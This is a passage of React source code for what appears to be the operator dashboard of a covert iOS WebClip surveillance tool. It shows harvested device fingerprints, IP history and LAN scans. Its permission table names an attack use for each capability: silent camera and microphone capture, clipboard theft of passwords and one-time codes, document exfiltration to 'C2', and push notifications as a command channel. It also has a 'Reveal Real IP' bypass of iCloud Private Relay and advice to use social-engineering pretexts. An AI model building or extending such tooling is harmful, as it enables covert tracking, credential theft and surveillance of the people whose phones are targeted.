import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { apiFetch, deleteDevice, sendCommand, updateDevice, parseUTC } from '../api/client.js';
import StatusBadge from '../components/StatusBadge.jsx';
import EventFeed from '../components/EventFeed.jsx';
import CommandPanel from '../components/CommandPanel.jsx';

const TABS = ['Fingerprint', 'Permissions', 'Harvest', 'Intelligence', 'Insights', 'Events', 'Console'];

function CollapsibleSection({ label, storageKey, children, locked, lockMsg }) {
  const [open, setOpen] = useState(() => {
    try { return localStorage.getItem('wc_collapse_' + storageKey) === '1'; } catch { return false; }
  });
  const toggle = () => {
    const next = !open;
    setOpen(next);
    try { localStorage.setItem('wc_collapse_' + storageKey, next ? '1' : '0'); } catch {}
  };
  return (
    <div style={{ background: '#141728', border: '1px solid rgba(255,255,255,0.09)', borderRadius: 8, marginBottom: 8, overflow: 'hidden' }}>
      <button onClick={toggle} style={{
        display: 'flex', alignItems: 'center', gap: 8, width: '100%', padding: '10px 14px',
        background: 'transparent', border: 'none', cursor: 'pointer', textAlign: 'left',
        borderBottom: open ? '1px solid rgba(255,255,255,0.05)' : 'none',
      }}>
        <span style={{ fontSize: 12, fontWeight: 600, color: locked ? '#4e5a70' : '#c9d1e8', flex: 1 }}>{locked ? '🔒 ' : ''}{label}</span>
        <span style={{ fontSize: 10, color: '#4e5a70', transform: open ? 'rotate(90deg)' : 'rotate(0)', transition: 'transform 0.15s', display: 'inline-block' }}>›</span>
      </button>
      {open && (
        <div style={{ padding: '12px 14px', animation: 'slideUp 0.15s ease' }}>
          {locked
            ? <div style={{ padding: '16px', color: '#4e5a70', fontSize: 12, textAlign: 'center' }}>
                🔒 {lockMsg ?? 'Permission not granted - request in the Permissions tab'}
              </div>
            : children}
        </div>
      )}
    </div>
  );
}

function CmdGroup({ type, cmds }) {
  const [open, setOpen] = useState(false);
  const executed = cmds.filter(c => c.status === 'executed').length;
  return (
    <div style={{ borderBottom: '1px solid #1c1c1e', marginBottom: 2 }}>
      <button onClick={() => setOpen(o => !o)} style={{
        width: '100%', display: 'flex', alignItems: 'center', gap: 8, padding: '8px 0',
        background: 'none', border: 'none', cursor: 'pointer', textAlign: 'left',
      }}>
        <span style={{ fontSize: 11, fontWeight: 700, color: '#c9d1e8', textTransform: 'uppercase', letterSpacing: '0.06em', flex: 1 }}>{type}</span>
        <span style={{ fontSize: 10, color: '#4e5a70' }}>{executed}/{cmds.length}</span>
        <span style={{ color: '#4e5a70', fontSize: 14, display: 'inline-block', transform: open ? 'rotate(90deg)' : 'none', transition: 'transform 0.12s ease' }}>›</span>
      </button>
      {open && cmds.map(c => (
        <div key={c.id} style={{ display: 'flex', gap: 8, alignItems: 'center', padding: '5px 0 5px 8px', borderTop: '1px solid #1c1c1e' }}>
          <span style={{
            padding: '1px 6px', borderRadius: 4, fontSize: 10, fontWeight: 600,
            background: c.status === 'executed' ? 'rgba(34,197,94,0.13)' : c.status === 'delivered' ? 'rgba(245,158,11,0.13)' : 'rgba(239,68,68,0.13)',
            color: c.status === 'executed' ? '#22c55e' : c.status === 'delivered' ? '#f59e0b' : '#ef4444',
          }}>{c.status}</span>
          <span style={{ fontSize: 10, color: '#4e5a70', marginLeft: 'auto' }}>
            {c.created_at ? parseUTC(c.created_at).toLocaleString('en-IL', { timeZone: 'Asia/Jerusalem', hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' }) : ''}
          </span>
        </div>
      ))}
    </div>
  );
}

function formatValue(value) {
  if (value === null || value === undefined) return '-';
  if (typeof value === 'boolean') return value ? 'Yes' : 'No';
  if (Array.isArray(value)) return value.length ? value.join(', ') : '-';
  if (typeof value === 'object') return JSON.stringify(value);
  return String(value);
}

function InfoCard({ label, value, live }) {
  const display = formatValue(value);
  const prevRef = React.useRef(display);
  const [flash, setFlash] = React.useState(false);

  React.useEffect(() => {
    if (live && prevRef.current !== display && prevRef.current !== undefined) {
      setFlash(true);
      const t = setTimeout(() => setFlash(false), 600);
      return () => clearTimeout(t);
    }
    prevRef.current = display;
  }, [display, live]);

  return (
    <div style={{
      background: flash ? 'rgba(59,130,246,0.09)' : '#0c0d1a',
      borderRadius: 10, padding: '12px 14px',
      border: `1px solid ${flash ? 'rgba(59,130,246,0.33)' : 'rgba(255,255,255,0.09)'}`,
      transition: 'background 0.4s ease, border-color 0.4s ease',
    }}>
      <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4, textTransform: 'uppercase', letterSpacing: '0.05em' }}>{label}</div>
      <div style={{
        fontSize: 12, wordBreak: 'break-all',
        color: flash ? '#3b82f6' : '#c9d1e8',
        transition: 'color 0.4s ease',
        fontWeight: flash ? 600 : 400,
      }}>{display}</div>
    </div>
  );
}

function OrientationCard({ orientation }) {
  const ROTATE = {
    'portrait-primary': 0,
    'portrait-secondary': 180,
    'landscape-primary': -90,
    'landscape-secondary': 90,
  };
  const rotateDeg = ROTATE[orientation] ?? 0;
  const prevRef = React.useRef(orientation);
  const [flash, setFlash] = React.useState(false);
  React.useEffect(() => {
    if (prevRef.current !== orientation && prevRef.current !== undefined) {
      setFlash(true);
      const t = setTimeout(() => setFlash(false), 600);
      return () => clearTimeout(t);
    }
    prevRef.current = orientation;
  }, [orientation]);

  return (
    <div style={{
      background: flash ? 'rgba(59,130,246,0.09)' : '#0c0d1a',
      borderRadius: 10, padding: '12px 14px',
      border: `1px solid ${flash ? 'rgba(59,130,246,0.33)' : 'rgba(255,255,255,0.09)'}`,
      transition: 'background 0.4s ease, border-color 0.4s ease',
      display: 'flex', alignItems: 'center', gap: 12,
    }}>
      <div style={{ flex: 1 }}>
        <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4, textTransform: 'uppercase', letterSpacing: '0.05em' }}>Orientation</div>
        <div style={{ fontSize: 12, color: flash ? '#3b82f6' : '#c9d1e8', transition: 'color 0.4s ease', fontWeight: flash ? 600 : 400 }}>
          {orientation || '-'}
        </div>
      </div>
      {orientation && (
        <div style={{ width: 32, height: 32, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <svg
            width="18" height="32"
            viewBox="0 0 18 32"
            style={{
              transform: `rotate(${rotateDeg}deg)`,
              transition: 'transform 0.4s ease',
            }}
          >
            <rect x="1" y="1" width="16" height="30" rx="3" ry="3"
              fill="none" stroke={flash ? '#3b82f6' : '#4e5a70'}
              strokeWidth="1.5" style={{ transition: 'stroke 0.4s ease' }} />
            <circle cx="9" cy="27" r="1.5"
              fill={flash ? '#3b82f6' : '#4e5a70'}
              style={{ transition: 'fill 0.4s ease' }} />
            <rect x="5" y="2.5" width="8" height="1" rx="0.5"
              fill={flash ? '#3b82f6' : '#4e5a70'}
              style={{ transition: 'fill 0.4s ease' }} />
          </svg>
        </div>
      )}
    </div>
  );
}

function AuthedImage({ url, style }) {
  const [src, setSrc] = React.useState(null);
  React.useEffect(() => {
    let revoked = false;
    fetch(url, { credentials: 'include' })
      .then(r => r.blob())
      .then(b => {
        if (!revoked) setSrc(URL.createObjectURL(b));
      })
      .catch(() => {});
    return () => {
      revoked = true;
      if (src) URL.revokeObjectURL(src);
    };
  }, [url]);
  return src ? <img src={src} style={style} alt="" /> : (
    <div style={{ ...style, background: '#141728', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      <span style={{ color: '#4e5a70', fontSize: 10 }}>...</span>
    </div>
  );
}

function Section({ title, children }) {
  return (
    <div style={{ marginBottom: 20 }}>
      <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase', color: '#4e5a70', marginBottom: 8 }}>{title}</div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 10 }}>
        {children}
      </div>
    </div>
  );
}

function parseEvent(ev) {
  if (!ev) return null;
  try { return typeof ev.data_json === 'string' ? JSON.parse(ev.data_json) : ev.data_json; } catch { return null; }
}

// Find most recent heartbeat data containing a specific field (events sorted newest-first).
function latestHbField(events, field) {
  for (const e of (events || [])) {
    if (e.type !== 'heartbeat') continue;
    const d = parseEvent(e);
    if (d?.[field] !== undefined) return d;
  }
  return null;
}

const SCREEN_MODELS = {
  '430×932': '16 Plus / 15 Plus / 14 Plus',
  '393×852': '16 / 15',
  '390×844': '14 / 13 / 12',
  '375×812': '13 mini / 12 mini',
  '375×667': 'SE (2nd/3rd gen) / 8 / 7',
  '320×568': 'SE (1st gen)',
  '414×896': '11 / XR / XS Max',
  '428×926': '13 Pro Max / 12 Pro Max',
  '430×932': '16 Plus / 15 Plus / 14 Plus',
  '402×874': '16 Pro',
  '440×956': '16 Pro Max',
  '393×852': '15 / 15 Plus',
};

function guessModel(ua, screen) {
  const ios = ua?.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, '.');
  if (!screen) return ios ? `iPhone (iOS ${ios})` : 'iPhone';
  const key = `${screen.w}×${screen.h}`;
  const model = SCREEN_MODELS[key];
  const base = model ? `iPhone ${model}` : 'iPhone';
  return ios ? `${base} - iOS ${ios}` : base;
}

function CollectedInfo({ device, events }) {
  const storageKey = device?.id ? `wc_relay_pending_${device.id}` : null;
  const [relayBypassPending, _setRelayBypassPending] = React.useState(false);

  React.useEffect(() => {
    if (storageKey) _setRelayBypassPending(localStorage.getItem(storageKey) === '1');
  }, [storageKey]);

  const setRelayBypassPending = (v) => {
    _setRelayBypassPending(v);
    if (storageKey) { if (v) localStorage.setItem(storageKey, '1'); else localStorage.removeItem(storageKey); }
  };
  const fp  = parseEvent(events?.find(e => e.type === 'fingerprint'));
  const net = parseEvent(events?.find(e => e.type === 'network'));
  const openEv = events?.find(e => e.type === 'app_open');
  const visEv  = events?.find(e => e.type === 'heartbeat');
  const latestHb = parseEvent(events?.find(e => e.type === 'heartbeat'));
  const latestHbOrientation = latestHbField(events, 'orientation');
  const orientation = latestHbOrientation?.orientation ?? fp?.screen?.orientation;
  const netTypeData = device?.current_network_type ?? null;
  const isOnline = device?.last_seen && (Date.now() - new Date(device.last_seen).getTime()) < 30000;

  let ipArr = [];
  let latestIpChangedAt = null;
  try {
    const parsed = device.ip_history_json ? JSON.parse(device.ip_history_json) : null;
    const raw = Array.isArray(parsed) ? parsed : (typeof parsed === 'string' && parsed ? [parsed] : []);
    // Support both old plain-string format and new {ip, ts} format
    ipArr = raw.map(e => (typeof e === 'object' && e !== null ? e.ip : e)).filter(Boolean);
    const entry0 = Array.isArray(raw) ? raw[0] : null;
    if (entry0 && typeof entry0 === 'object' && entry0.ts) latestIpChangedAt = new Date(entry0.ts);
  } catch { ipArr = []; }

  const ua = device.user_agent || fp?.ua;
  const model = guessModel(ua, fp?.screen);

  // WiFi inference from LAN scan results
  const _lanHostsEv = events?.find(e => {
    const d = parseEvent(e);
    return e.type === 'lan_hosts' && d?.hosts?.length > 0;
  });
  const wifiInferred = _lanHostsEv ? (() => {
    const d = parseEvent(_lanHostsEv);
    return { ts: parseUTC(_lanHostsEv.timestamp), count: d?.hosts?.length ?? 0, cidr: d?.cidr ?? '' };
  })() : null;
  // Stale if the scan is older than 6 hours
  const wifiStale = wifiInferred && wifiInferred.ts && (Date.now() - wifiInferred.ts.getTime()) > 6 * 60 * 60 * 1000;

  return (
    <div>
      {/* Identity */}
      <Section title="Identity">
        <InfoCard label="Model" value={model} />
        <InfoCard label="User Agent" value={ua} />
        <InfoCard label="First Seen" value={device.first_seen ? parseUTC(device.first_seen).toLocaleString('en-IL', { timeZone: 'Asia/Jerusalem' }) : null} />
        <div style={{ background: '#0c0d1a', borderRadius: 10, padding: '12px 14px', border: '1px solid #2c2c2e' }}>
          <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.05em' }}>Device IP(s)</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6, alignItems: 'center', maxHeight: 90, overflowY: 'auto' }}>
            {ipArr.length === 0 && <span style={{ fontSize: 12, color: '#4e5a70' }}>-</span>}
            {ipArr.map((ip, i) => {
              const netEv = i === 0
                ? events?.find(e => e.type === 'network_type' && e.data?.ip === ip)
                : null;
              const netType = netEv?.data?.type;
              const carrier = netEv?.data?.carrier;
              return (
                <React.Fragment key={ip}>
                  <span style={{
                    fontSize: 12, fontFamily: 'monospace',
                    color: i === 0 ? '#22c55e' : '#4e5a70',
                    background: i === 0 ? 'rgba(34,197,94,0.09)' : 'transparent',
                    border: i === 0 ? '1px solid #30d15844' : 'none',
                    borderRadius: 5, padding: i === 0 ? '1px 7px' : '0',
                    fontWeight: i === 0 ? 700 : 400,
                  }}>
                    {ip}{i === 0 && <span style={{ fontSize: 9, marginLeft: 5, verticalAlign: 'middle', color: '#22c55e' }}>CURRENT</span>}
                  </span>
                  {netType && (
                    <span style={{
                      fontSize: 10, fontWeight: 700, padding: '2px 7px', borderRadius: 6,
                      background: netType === 'cellular' ? 'rgba(245,158,11,0.09)' : 'rgba(59,130,246,0.09)',
                      border: `1px solid ${netType === 'cellular' ? 'rgba(245,158,11,0.27)' : 'rgba(59,130,246,0.27)'}`,
                      color: netType === 'cellular' ? '#f59e0b' : '#3b82f6',
                    }}>
                      {netType === 'cellular' ? `📶 ${carrier || 'Cellular'}` : `🌐 ${carrier || 'WiFi'}`}
                    </span>
                  )}
                </React.Fragment>
              );
            })}
          </div>
        </div>
        <InfoCard label="Fingerprint Hash" value={device.fingerprint_hash || fp?.delta_hash} />
      </Section>

      {/* Hardware */}
      <Section title="Hardware">
        <InfoCard label="CPU Cores" value={fp?.hardwareConcurrency} />
        <InfoCard label="Screen" value={fp?.screen ? `${fp.screen.w}×${fp.screen.h} @${fp.screen.ratio}x` : null} />
        <InfoCard label="Color Depth" value={fp?.screen?.depth != null ? `${fp.screen.depth}-bit` : null} />
        <OrientationCard orientation={orientation} />
        <InfoCard label="Touch Points" value={fp?.touchPoints} />
        <InfoCard label="Standalone" value={parseEvent(openEv)?.standalone ?? fp?.standalone} />
        <InfoCard label="Microphones" value={fp?.deviceCounts?.audioinput} />
        <InfoCard label="Cameras" value={fp?.deviceCounts?.videoinput} />
        <InfoCard label="Speakers" value={fp?.deviceCounts?.audiooutput} />
      </Section>

      {/* Network */}
      <Section title="Network">
        <div style={{ background: '#0c0d1a', borderRadius: 10, padding: '16px 18px', border: '1px solid #2c2c2e', gridColumn: 'span 2' }}>
          <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.05em' }}>Network Type</div>
          {netTypeData ? (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
                {netTypeData.apple_relay ? (
                  <span style={{
                    fontSize: 13, fontWeight: 700, padding: '5px 14px', borderRadius: 8,
                    background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(78,90,112,0.67)', color: '#c9d1e8', flexShrink: 0,
                  }}>🍎 Apple Relay</span>
                ) : (
                  <span style={{
                    fontSize: 13, fontWeight: 700, padding: '5px 14px', borderRadius: 8,
                    background: netTypeData.type === 'cellular' ? 'rgba(245,158,11,0.09)' : 'rgba(59,130,246,0.09)',
                    border: `1px solid ${netTypeData.type === 'cellular' ? 'rgba(245,158,11,0.27)' : 'rgba(59,130,246,0.27)'}`,
                    color: netTypeData.type === 'cellular' ? '#f59e0b' : '#3b82f6',
                    flexShrink: 0,
                  }}>
                    {netTypeData.type === 'cellular' ? '📶 Cellular' : '🌐 WiFi'}
                  </span>
                )}
                <div style={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                  {netTypeData.carrier && (
                    <span style={{ fontSize: 14, fontWeight: 600, color: '#c9d1e8' }}>{netTypeData.carrier}</span>
                  )}
                  {netTypeData.asn && (
                    <span style={{ fontSize: 11, color: '#4e5a70' }}>{netTypeData.asn}</span>
                  )}
                </div>
              </div>
              {netTypeData.apple_relay && (
                <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', background: '#141728', borderRadius: 8, border: '1px solid #3a3a3c' }}>
                  <span style={{ fontSize: 12, color: '#4e5a70', flex: 1 }}>
                    {relayBypassPending
                      ? '⏳ Bypass queued - waiting for device heartbeat...'
                      : 'Real IP hidden by iCloud Private Relay. Trigger bypass via social engineering.'}
                  </span>
                  {relayBypassPending ? (
                    <button
                      onClick={async () => {
                        try {
                          await fetch(`/api/devices/${device?.id}/cancel-relay-bypass`, { method: 'POST', credentials: 'include' });
                          setRelayBypassPending(false);
                        } catch (err) {
                          console.error('relay cancel error', err);
                        }
                      }}
                      style={{ fontSize: 11, fontWeight: 700, padding: '5px 12px', borderRadius: 6, background: 'rgba(78,90,112,0.13)', border: '1px solid rgba(78,90,112,0.40)', color: '#4e5a70', cursor: 'pointer', whiteSpace: 'nowrap' }}
                    >Cancel</button>
                  ) : (
                    <button
                      onClick={async () => {
                        try {
                          const res = await fetch(`/api/devices/${device?.id}/trigger-relay-bypass`, { method: 'POST', credentials: 'include' });
                          if (res.ok) setRelayBypassPending(true);
                        } catch (err) {
                          console.error('relay bypass error', err);
                        }
                      }}
                      style={{ fontSize: 11, fontWeight: 700, padding: '5px 12px', borderRadius: 6, background: 'rgba(239,68,68,0.13)', border: '1px solid rgba(239,68,68,0.40)', color: '#ef4444', cursor: 'pointer', whiteSpace: 'nowrap' }}
                    >Reveal Real IP</button>
                  )}
                </div>
              )}
            </div>
          ) : (
            <span style={{ fontSize: 12, color: '#4e5a70' }}>-</span>
          )}
          {wifiInferred && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 10, padding: '6px 10px', borderRadius: 7, flexWrap: 'wrap', opacity: wifiStale ? 0.5 : 1,
              background: wifiStale ? 'rgba(78,90,112,0.07)' : 'rgba(59,130,246,0.05)',
              border: `1px solid ${wifiStale ? 'rgba(78,90,112,0.20)' : 'rgba(59,130,246,0.13)'}`,
            }}>
              <span style={{ fontSize: 13, fontWeight: 700, color: wifiStale ? '#4e5a70' : '#3b82f6' }}>🌐 WiFi</span>
              <span style={{ fontSize: 10, color: wifiStale ? '#4e5a70' : '#3b82f6', background: wifiStale ? 'rgba(78,90,112,0.13)' : 'rgba(59,130,246,0.09)', border: `1px solid ${wifiStale ? 'rgba(78,90,112,0.27)' : 'rgba(59,130,246,0.20)'}`, borderRadius: 4, padding: '1px 6px' }}>
                {wifiStale ? 'stale' : 'inferred'}
              </span>
              <span style={{ fontSize: 11, color: wifiStale ? '#4e5a70' : '#c9d1e8', fontFamily: 'monospace' }}>{wifiInferred.cidr}</span>
              <span style={{ fontSize: 10, color: '#4e5a70' }}>{wifiInferred.count} hosts</span>
              <span style={{ fontSize: 10, color: '#4e5a70', marginLeft: 'auto' }}>
                {wifiInferred.ts?.toLocaleString('en-IL', { timeZone: 'Asia/Jerusalem', hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' })}
              </span>
            </div>
          )}
        </div>
        {(() => {
          const rtc = fp?.webrtcIPs;
          const pubIPs = Array.isArray(rtc?.public) ? rtc.public : (Array.isArray(rtc) ? rtc : []);
          const locIPs = Array.isArray(rtc?.local) ? rtc.local : [];
          const lines = [
            pubIPs.length ? `Public: ${pubIPs.join(', ')}` : null,
            locIPs.length ? `Local: ${locIPs.join(', ')}` : null,
          ].filter(Boolean).join(' | ');
          return <InfoCard label="WebRTC IP(s)" value={lines || 'None detected'} />;
        })()}
      </Section>

      {/* Browser */}
      <Section title="Browser">
        <InfoCard label="Language" value={fp?.language} />
        <InfoCard label="Languages" value={fp?.languages} />
        <InfoCard label="Timezone" value={fp?.timezone} />
        <InfoCard label="Cookies" value={fp?.cookiesEnabled} />
        <InfoCard label="PDF Viewer" value={fp?.pdfViewerEnabled} />
        <InfoCard label="History Length" value={fp?.historyLength} />
        <InfoCard label="Plugins" value={fp?.plugins?.length ? fp.plugins.join(', ') : 'None'} />
      </Section>

      {/* Display & Input */}
      <Section title="Display & Input">
        <InfoCard label="Color Scheme" value={fp?.media?.prefersColorScheme} />
        <InfoCard label="Reduced Motion" value={fp?.media?.prefersReducedMotion} />
        <InfoCard label="Pointer" value={fp?.media?.pointer} />
        <InfoCard label="Hover" value={fp?.media?.hover} />
      </Section>

      {/* Behavior */}
      <Section title="Behavior">
        <InfoCard label="Last App Open" value={openEv?.timestamp ? parseUTC(openEv.timestamp).toLocaleString('en-IL', { timeZone: 'Asia/Jerusalem' }) : null} live />
        <InfoCard label="Visibility" value={visEv ? (parseEvent(visEv)?.visible ? 'Foreground' : 'Background') : null} live />
      </Section>

      {/* Fingerprints */}
      <Section title="Fingerprints">
        <InfoCard label="WebGL Renderer" value={fp?.webgl?.renderer} />
        <InfoCard label="WebGL Vendor" value={fp?.webgl?.vendor} />
        <InfoCard label="Audio FP" value={fp?.audioFp} />
        <InfoCard label="Font FP" value={fp?.fontsFp?.slice(0, 30)} />
        <InfoCard label="Storage Quota" value={fp?.storageQuota?.quota != null ? `${Math.round(fp.storageQuota.quota / 1e6)} MB` : null} />
      </Section>

      {!fp && !net && (
        <div style={{ padding: 32, textAlign: 'center', color: '#4e5a70' }}>
          Waiting for device to beacon…
        </div>
      )}
    </div>
  );
}

const PERMISSION_META = [
  // ── Currently Testing ──────────────────────────────────────────────────────
  { key: 'geolocation',     module: 'geo',          label: 'Geolocation',        icon: '📍', severity: 'critical', group: 'ephemeral',
    value: 'GPS coordinates (lat/lng/alt), street address, movement tracking',
    attack: 'Physical location, home/work address, live tracking' },

  // ── Untested ───────────────────────────────────────────────────────────────
  { key: 'camera',          module: 'camera',        label: 'Camera',             icon: '📷', severity: 'critical', group: 'each_time',
    value: 'Live video feed, photos, face capture',
    attack: 'Silent photo/video capture, facial recognition, document theft' },
  { key: 'microphone',      module: 'audio',         label: 'Microphone',         icon: '🎤', severity: 'critical', group: 'each_time',
    value: 'Live audio, speech-to-text',
    attack: 'Ambient audio recording, conversation capture' },


  { key: 'notifications',   module: 'push',          label: 'Notifications',      icon: '🔔', severity: 'high',     group: 'persistent',
    value: 'Push notifications - survives app close (iOS 16.4+ PWA). ⚠️ Triggers tap overlay on device before iOS dialog.',
    attack: 'C2 channel that works when app is closed, always-on beacon' },
  { key: 'motion',          module: 'motion',        label: 'Motion + Compass',   icon: '📳', severity: 'high',     group: 'session',
    value: 'Accelerometer, gyroscope, magnetometer (webkitCompassHeading) - iOS 13+',
    attack: 'Gait recognition, PIN entry inference, compass heading, activity tracking' },
  { key: 'push',            module: 'push',          label: 'Push Subscription',  icon: '📡', severity: 'high',     group: 'persistent',
    value: 'Server-initiated wake-up via Web Push (iOS 16.4+ PWA)',
    attack: 'C2 channel - server sends commands even when app is in background' },

  { key: 'filesystem',      module: 'filesystem',    label: 'File/Photo Upload',  icon: '📁', severity: 'critical', group: 'each_time',
    value: 'File picker (all types) - user selects any file, sent as base64 to C2',
    attack: 'Document theft - PDFs, Word, Excel, iCloud Drive files via social engineering pretext' },




  { key: 'webauthn',        module: null,            label: 'WebAuthn / Passkey', icon: '🔐', severity: 'high',     group: 'not_impl',
    value: 'Requires RP server infrastructure - not yet deployed',
    attack: 'Trigger credentials.create() under attacker-controlled domain → user completes Face ID → passkey saved to iCloud Keychain. On every future visit, credentials.get() + Face ID proves biometric presence of that specific user. Provides persistent identity-verified auth channel without accessing any existing credentials. Infrastructure: lookalike domain + TLS + WebAuthn RP server (python-fido2 / @simplewebauthn/server, ~1 day setup).' },

  { key: 'clipboard-read',  module: 'clipboard',     label: 'Clipboard Read',     icon: '📋', severity: 'high',     group: 'each_time',
    value: 'Clipboard text - requires active user gesture on iOS',
    attack: 'Passwords, OTPs, credit card numbers, crypto keys' },




  // ── New capability modules ──────────────────────────────────────────────────



  { key: 'web-audio',      module: null,             label: 'Run in background with Web Audio (Chime)',  icon: '🔊', severity: 'low',      group: 'gesture',
    value: 'Startup chime on first tap - no system permission dialog required',
    attack: 'Gesture unlock confirms active user; AudioContext keeps beacon alive in background' },
];

const PASSIVE_META = [
  { label: 'User Agent / iOS Version', icon: '🆔', value: 'Device model, OS version, browser version', approval: false },
  { label: 'Screen & Pixel Ratio', icon: '📐', value: 'Exact screen dims, helps narrow device model', approval: false },
  { label: 'WebRTC Local IP', icon: '🌐', value: 'LAN IP, VPN leak detection', approval: false },
  { label: 'CPU Cores', icon: '⚙️', value: 'hardwareConcurrency - helps fingerprint device class', approval: false },
  { label: 'WebGL Renderer', icon: '🎮', value: 'Exact GPU - identifies device generation (Apple A17 etc.)', approval: false },
  { label: 'Audio Fingerprint', icon: '🎵', value: 'Hardware-unique floating-point hash', approval: false },
  { label: 'Font Metrics', icon: '🔤', value: 'Canvas font rendering - unique per OS/device', approval: false },
  { label: 'Timezone / Language', icon: '🌍', value: 'Locale, region, reveals location indirectly', approval: false },
  { label: 'Network Status', icon: '📶', value: 'Online/offline, connection type changes', approval: false },
  { label: 'Device Orientation', icon: '🔄', value: 'Portrait/landscape, secondary side', approval: false },
  { label: 'Speech Voices', icon: '🗣️', value: '68-voice list unique per device/locale combo', approval: false },
  { label: 'Device IP', icon: '🖥️', value: 'Real public IP captured on every beacon', approval: false },
  { label: 'Visibility State', icon: '👁️', value: 'Foreground/background transitions with timestamps', approval: false },
  { label: 'enumerateDevices', icon: '🎙️', value: 'Mic/camera/speaker count without labels', approval: false },
  { label: 'CSS Media Queries', icon: '🎨', value: 'Dark mode, reduced motion, pointer type', approval: false },
  { label: 'Storage Quota', icon: '📦', value: 'Total quota - reveals device storage tier', approval: false },
];

const SEVERITY_COLOR = { critical: '#ef4444', high: '#f59e0b', medium: '#f59e0b', low: '#22c55e' };
const STATE_COLOR = { granted: '#22c55e', activated: '#22c55e', denied: '#ef4444', prompt: '#f59e0b', 'not-activated': '#4e5a70', unsupported: '#4e5a70', unknown: '#4e5a70', indeterminate: '#a78bfa' };
const STATE_LABEL = { granted: 'Granted', activated: 'Activated', denied: 'Denied', prompt: 'Not Asked', 'not-activated': 'Not Activated', unsupported: 'N/A', unknown: 'Unknown', indeterminate: 'Cannot determine (Safari)' };

const PERM_GROUPS = [
  { id: 'gesture',    icon: '👆', label: 'Gesture-Unlocked', en: 'No permission - requires a tap to activate', color: '#a78bfa' },

  { id: 'persistent', icon: '🔒', label: 'Survives close', en: 'Granted once - persists forever',           color: '#22c55e' },
  { id: 'session',    icon: '📱', label: 'Survives exit',  en: 'Granted once - survives exit only',         color: '#3b82f6' },
  { id: 'ephemeral',  icon: '⏱',  label: 'Ephemeral',      en: 'Granted once - lost on exit',              color: '#f59e0b' },
  { id: 'each_time',  icon: '🔄', label: 'Every time',     en: 'Must request on each visit',                color: '#ef4444' },
  { id: 'not_impl',   icon: '🚧', label: 'Not Implemented', en: 'Requires additional infrastructure to deploy', color: '#4e5a70' },
];
const GROUP_MAP = Object.fromEntries(PERM_GROUPS.map(g => [g.id, g]));

function RawRequestWarning({ perm, onConfirm, onCancel }) {
  return (
    <div
      onClick={onCancel}
      style={{
        position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        zIndex: 10000,
      }}
    >
      <div
        onClick={e => e.stopPropagation()}
        style={{
          background: '#141728', border: '1px solid rgba(245,158,11,0.27)', borderRadius: 16,
          padding: 24, maxWidth: 400, width: '90%',
        }}
      >
        <div style={{ fontSize: 24, marginBottom: 12 }}>⚠️</div>
        <div style={{ fontSize: 15, fontWeight: 700, color: '#f59e0b', marginBottom: 10 }}>
          Raw Permission Request
        </div>
        <div style={{ fontSize: 13, color: 'rgba(201,209,232,0.80)', lineHeight: 1.6, marginBottom: 20 }}>
          The WebClip will request <strong style={{ color: '#c9d1e8' }}>{perm.label}</strong> with no cover story and no social engineering context.
          <br /><br />
          The native iOS dialog will appear with zero justification - the user is likely to deny it or become suspicious.
          <br /><br />
          For real engagements, use a <strong style={{ color: '#f59e0b' }}>Harvest flow</strong> with a convincing pretext instead.
        </div>
        <div style={{ display: 'flex', gap: 10 }}>
          <button
            onClick={onCancel}
            style={{
              flex: 1, padding: '10px 0', borderRadius: 10, border: '1px solid #2c2c2e',
              background: 'transparent', color: '#c9d1e8', fontSize: 14, fontWeight: 600, cursor: 'pointer',
            }}
          >Cancel</button>
          <button
            onClick={onConfirm}
            style={{
              flex: 1, padding: '10px 0', borderRadius: 10,
              background: 'rgba(245,158,11,0.13)', color: '#f59e0b', fontSize: 14, fontWeight: 600, cursor: 'pointer',
              border: '1px solid rgba(245,158,11,0.27)',
            }}
          >Send anyway</button>
        </div>
      </div>
    </div>
  );
}

const GEO_WATCH_OPTIONS = [
  { label: '📍 Once',    mode: 'once',  duration: null },
  { label: '🔄 10s',    mode: 'watch', duration: 10   },
  { label: '🔄 30s',    mode: 'watch', duration: 30   },
  { label: '🔄 1min',   mode: 'watch', duration: 60   },
  { label: '🔄 Live',   mode: 'watch', duration: null },
];

function PermissionsPanel({ events, deviceId, onSent, onFastPoll, device }) {
  const [expanded, setExpanded] = useState(null);
  const [requesting, setRequesting] = useState(null);
  const [sentKey, setSentKey] = useState(null);
  const [warnPerm, setWarnPerm] = useState(null);
  const [geoWatching, _setGeoWatching] = useState(() => sessionStorage.getItem(`wc_geow_${deviceId}`) === '1');
  function setGeoWatching(v) { sessionStorage.setItem(`wc_geow_${deviceId}`, v ? '1' : '0'); _setGeoWatching(v); }
  const [geoWatchOpt, _setGeoWatchOpt] = useState(() => sessionStorage.getItem(`wc_geoopt_${deviceId}`) || null);
  function setGeoWatchOpt(v) { sessionStorage.setItem(`wc_geoopt_${deviceId}`, v || ''); _setGeoWatchOpt(v || null); }
  const geoWatchTimerRef = useRef(null);

  // Auto-clear geo watch state when device goes offline (WebClip was fully closed)
  const prevStatusRef = useRef(null);
  useEffect(() => {
    if (!device?.last_seen) return;
